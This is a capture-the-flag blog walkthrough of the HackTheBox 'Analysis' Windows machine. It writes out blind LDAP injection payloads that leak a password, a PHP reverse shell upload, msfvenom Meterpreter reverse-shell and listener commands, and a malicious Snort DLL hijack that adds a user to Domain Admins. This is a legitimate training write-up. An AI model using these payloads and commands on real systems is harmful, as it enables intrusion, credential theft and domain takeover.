---
title: "CTF: Analysis (HtB, Windows, Hard)"
excerpt: "A detailed walkthrough of \"Analysis\" machine on HackTheBox."
tagline: ""
header:
  teaser: /docs/assets/images/teasers/ctf/analysis.png
  og_image: /docs/assets/images/teasers/ctf/analysis.png
  overlay_image: /docs/assets/images/teasers/ctf/analysis2.png
author_profile: false
share: true
tags:
  - HackTheBox
  - Windows
  - Difficulty-Hard
  - LDAP Injection
  - DLL Injection
  - Snort
categories:
  - CTF
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

## Description

This is a detailed walkthrough of "Analysis" machine on HackTheBox platform that is based on Windows operating system and categorized as "Hard"
by difficulty. The machine has Windows Server and Active Directory services deployed on it. In order to establish a foothold on the system, it is necessary to exploit an insecurely configured web application through LDAP Injection. Privilege escalation involves performing DLL Injection on a program running with system privileges.

## Reconnaissance

Our journey begins with a port scan using **nmap**:

```bash
nmap -sT -sC -sV -T4 <IP> #-sT - TCP scan; -sC - run default scripts, -sV - enumerate service version, -T4 - scan speed
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/nmapscan.png" alt="">
  <figcaption>Results of nmap scan.</figcaption>
</figure>

The services running on the machine indicate that it has Windows Server and Active Directory deployed on it. Further enumeration should be performed on TCP ports 80 (**http**), 88 (**kerberos**), 135 (**RPC**), 139/445 (**SMB**), 389/3268 (**LDAP**), 3306 (**MySQL**). The scan also reveals the target domain name - *analysis.htb*. Repeating the scan with **-p** flag will reveal another interesting open port - 47001 **winrm**, which will used in the privilege escalation process to establish a solid shell on the machine:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/47001winrm.png" alt="">
  <figcaption></figcaption>
</figure>

Attempting to dump any useful information from MySQL, LDAP, RPC and SMB services provided no results. In contrast, it's possible to perform Username Enumeration attack against Kerberos to reveal domain users. For this, one can use a tool called **Kerbrute**. According to [official documentation](https://github.com/ropnop/kerbrute/blob/master/README.md), to enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a **PRINCIPAL UNKNOWN** error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID 4768 if Kerberos logging is enabled. Let's proceed with the attack! In order to perform username enumeration, you will need a username list. I recommend using [this one](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt). **Seclists** should be installed on Kali by default.

```bash
./kerbrute_linux_amd64 userenum -d <domain name> --dc <target IP> users.txt
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/kerbrute.png" alt="">
  <figcaption>Domain usernames.</figcaption>
</figure>

We have received a set of usernames:

> jdoe@analysis.htb\
  ajohnson@analysis.htb\
  cwilliams@analysis.htb\
  wsmith@analysis.htb\
  jangel@analysis.htb\
  technician@analysis.htb

Now let's attempt to find any hidden HTTP resources with **Fuff**:

```bash
ffuf -H 'Host: FUZZ.analysis.htb' -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 50 -u http://analysis.htb
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/fuff.png" alt="">
  <figcaption>Fuzzing results.</figcaption>
</figure>

Fuff discovered a subdomain *internal.analysis.htb*. However, it meets the visitor with "403 - Forbidden: Access is denied":

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/403forbidden.png" alt="">
  <figcaption></figcaption>
</figure>

 At this point, we must not give up on web/subdomain enumeration, since other locations might not have restriced access. Let's use **dirsearch** to enumerate *internal.analysis.htb* further for hidden directories and files. For some reason, though they have common names, sometimes dirsearch would not find the required content on the subdomain, so I had to re-run the tool with different wordlists against specific discovered directories as shown below:

```bash
 dirsearch -u http://internal.analysis.htb:80/ -r -e php
 # -r - recusrsive search
 # -e - search for files with .php extension
 # using default wordlist
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/dirsearch1.png" alt="">
  <figcaption></figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/dirsearch2.png" alt="">
  <figcaption></figcaption>
</figure>

```bash
dirsearch -u http://internal.analysis.htb:80/users -r -e php -w /usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/dirsearch3.png" alt="">
  <figcaption></figcaption>
</figure>

The tool discovered several locations of interest:

> /dashboard/upload.php\
  /users/list.php\
  /employess/login.php

## Exploitation / Foothold

Navigate to http://internal.analysis.htb/users/list.php:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/listphp.png" alt="">
  <figcaption></figcaption>
</figure>

It appears that it's possible to interact with the **list.php** script and the web app informs us that a parameter is required to send requests to it. To discover missing parameter, the challenger can perform parameter fuzzing with **Burp Suite**. Find a request issued to */users/list.php* and send it to **Intruder**. On the "Positions" tab, configure payload positions as shown below:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/burpintruder.png" alt="">
  <figcaption></figcaption>
</figure>

 In **Payloads** tab, select "Simple list" as payload type. In **Payload settings** menu below, import a list of common php parameters such as [this one](https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt):

 <figure class="align-center">
   <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/paramlist.png" alt="">
   <figcaption></figcaption>
 </figure>

 Click on **Start attack** and check attack results. It appears that the payload **"name"** has caused the app to return a longer response, which means it could be the correct parameter to supply to our attack request:

 <figure class="align-center">
   <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/nameparam.png" alt="">
   <figcaption></figcaption>
 </figure>

 Now if we were to supply a **"test"** value with the **"name"** parameter, we would get the following response:

 <figure class="align-center">
   <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/nametest.png" alt="">
   <figcaption></figcaption>
 </figure>

 According to the field in the output above, it appears that **list.php** scripts sends a LDAP query to list information about the user. We can attempt to discover information about the users found during Kerberos Username Enumeration step. The query returns a result when the user **techinican** is specified in the "name" parameter:

 <figure class="align-center">
   <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/nametechnician.png" alt="">
   <figcaption></figcaption>
 </figure>

### LDAP Injection

 It appears to be possible to perform LDAP Injection to extract interesting information about the user. In order to learn more about LDAP structure (objects and atributes) and the LDAP Injection attack itself, I recommend reading articles below:
 * [Common LDAP Properties and Script Attributes List with Examples](https://www.computerperformance.co.uk/logon/ldap-attributes-active-directory/)
 * [Complete Guide to LDAP Injection: Types, Examples, and Prevention](https://brightsec.com/blog/ldap-injection/)

 Further testing by supplying **"=*)** as value in the "name" parameter showed the app is only able to request information about **technician** user. When the app displays "technician" as Username and First Name in the webform, it means that the provided query was correct. If our query is incorrect, "technician" will not appear on the page. This type of response is condition-based, which means in this case, we are dealing with **Blind LDAP Injection**. Using the second article from the list above, we can construct the following payload:

 *name=\*)(%26(objectClass=user)([payload]=\*)*

 <figure class="align-center">
   <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/ldappayload.png" alt="">
   <figcaption></figcaption>
 </figure>

This payload will issue a LDAP query to select information about **technician** from an attribute specified in its user object. The "*" means "select everything", similarly to SQL. We can enumerate possible user object attributes using [this list](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt):

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/givenname.png" alt="">
  <figcaption></figcaption>
</figure>

One of the attributes we could inject input into is **givenName**. Setting *givenName=technician* will cause the app to return "technician" in response, meaning our query was correct and, in fact, the user's givenName attribute is equal to "technician" in the database. We can further modify the request to *givenName=tech* - in this case, the app will also return "technician" in the response. Our requst would be interpreted in the following way by the backend: "select the value of givenName attribute that starts with "tech" and ends with whatever". Supplying an incorrect symbol before the "*" sign <ins>would not</ins> return "technician" in the response. This way, it becomes possible to enumerate the values of user object attributes.

Now let's assume common insecure configuration practices performed by system administators while creating Active Directory users. One of those insecure practices would be specifying **user password in the description**.

Now let's construct a payload that would enumerate **description** attribute of the user object:

*name=\*)(%26(objectClass=user)(description=\*)*

In **Burp Suite Intruder** module, select "Brute forcer" as the payload type and add the following characters as the character set:

> !"#$%&'()*+,-.//0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/intruderfinal.png" alt="">
  <figcaption></figcaption>
</figure>

Set payload placeholder after "*description=*" and run the attack. This results in the following:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/intruderfinal9.png" alt="">
  <figcaption></figcaption>
</figure>

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/intruderfinaltech.png" alt="">
  <figcaption></figcaption>
</figure>

It looks like payload "9" has trigged conditional response ("technician" shows in the output) and the password starts with 9! Modify the payload further by putting "9" before the placeholder. The next password character should appear in the result:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/intruderfinal7.png" alt="">
  <figcaption>7</figcaption>
</figure>

Continue the process until you leak technician's password to get the first set of credentials. The password has 14 characters and "\*" as the 7th character. Then navigate to an endpoint discovered previously, *http://internal.analysis.htb/employees/login.php*. Login as **technician@analysis.htb** with the discovered password. Administrative dashboard will appear:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/admindash.png" alt="">
  <figcaption></figcaption>
</figure>

### Insecure Upload / Shell

Navigate to "**SOC Report**" tab which has file upload functionality. Upload a **php reverse shell** of your choice and then access it by the following URL: *http://internal.analysis.htb/dashboard/uploads/(YOURSHELL).php*. In my case, I am using **p0wnyshell**.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/shellpwn.png" alt="">
  <figcaption></figcaption>
</figure>

Foothold has been establised.

## Privilege Escalation

At this point, it is recommended to establish a more persitent shell on the host to be able to perform further enumeration. It can be done with **Meterpreter** module in **Metasploit**. Generate Meterpreter payload with the following command (make sure to use x64 payload!):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP ADDR> LPORT=<LISTENING PORT> -f exe > <FILENAME>
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/msfvenom.png" alt="">
  <figcaption></figcaption>
</figure>

Start a Meterpreter listener on the specified address and port:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost = <IP ADDR>
set lport = <LISTENING PORT>
run
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/meterlistener.png" alt="">
  <figcaption></figcaption>
</figure>

You can easily upload the generated Meterpreter payload using the same file upload functionality on the website. Once uploaded, move it to a safer directory via established PHP reverse shell (in case there's some cleanup script running on the background that could delete our files from the current directory).

```bash
move backdoor.exe C:`\`windows`\`temp
```
Meterpreter listener should receive a callback:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/meterpretercallback.png" alt="">
  <figcaption></figcaption>
</figure>

Upload **winPEASx64.exe** (Windows privilege escalation assistant tool available [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20240124-4b54e914)) to the Target machine using Meterpreter:

```bash
upload <file directory>/winPEASx64.exe c:`\`windows`\`temp
```
Navigate to the specified directory and run **WinPEAS**. The tool will leak **AutoLogon** credentials for user **jdoe**:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/autologon.png" alt="">
  <figcaption></figcaption>
</figure>

We are at the final part of privilege escalation. To proceed, connect to **winrm** service using **Evil-WinRM**:

```bash
evil-winrm -i 10.129.150.6 -u jdoe -p <password>
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/winrmshell.png" alt="">
  <figcaption>WinRM shell established as jdoe.</figcaption>
</figure>

### User flag

Get the user flag in jdoe's Desktop folder:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/userflag.png" alt="">
  <figcaption></figcaption>
</figure>

For some reason, **jdoe** does not have access to Temp folder, so let's upload **winPEASx64.exe** to the user's Desktop folder with Evil-WinRM:

```bash
 upload <path-to-file>winPEASx64.exe
 ./winPEASx64.exe # run winPEAS
```

WinPEAS will discover a potential DLL injection vulnerability for Snort program running on the host:


<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/snort.png" alt="">
  <figcaption></figcaption>
</figure>

### CVE-2016-1417

Search the internet for DLL injection vulnerabilities related to Snort. Eventually, you will come across **CVE-2016-1417** - "snort.exe can be exploited to execute arbitrary code on victims system via DLL hijacking, the vulnerable DLL is "tcapi.dll". If a user opens a ".pcap" file from a remote share using snort.exe and the DLL exists in that directory."

However, in our case, we will not need to set up a remote share hosting a .pcap file in order to perform DLL hijacking: according to **snort.conf** configuration file (can be found in C:\Snort\etc folder), there's a dynamic processor library folder configured from where Snort is able to load arbitrary .dll files. The Attacker can generate a malicious .dll, place it in the folder and run Snort to execute malicious code.

The dynamic preprocessor library is located at *C:\Snort\lib\snort_dynamicpreprocessor*:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/dynamicproc.png" alt="">
  <figcaption></figcaption>
</figure>

Generate a malicious .dll file with **msfvenom** by issuing the following command:

```bash
msfvenom -p windows/x64/exec cmd='net group "Admins du domaine" jdoe /add /domain' -f dll -o tcapi.dll
# The system language is set to French
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/tcapidll.png" alt="">
  <figcaption></figcaption>
</figure>

This command will add **jdoe** to Domain Admins group, providing us with the highest privilege level on the system. Upload the generated .dll file to the target folder:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/uploaddll.png" alt="">
  <figcaption></figcaption>
</figure>

Run Snort:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/snortrun.png" alt="">
  <figcaption></figcaption>
</figure>

Verify that  **jdoe** was added to Domain Admins:

```bash
net user jdoe
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/jdoeadmin.png" alt="">
  <figcaption>Domain Admin obtained.</figcaption>
</figure>

### Root flag

Navigate to *C:\users\Administrateur\Desktop* to get the root flag:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/analysis/rootflag.png" alt="">
  <figcaption></figcaption>
</figure>

**Thank you for your attention and happy hacking!**
{: .notice--primary}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/hackerman.png" alt="">
  <figcaption></figcaption>
</figure>
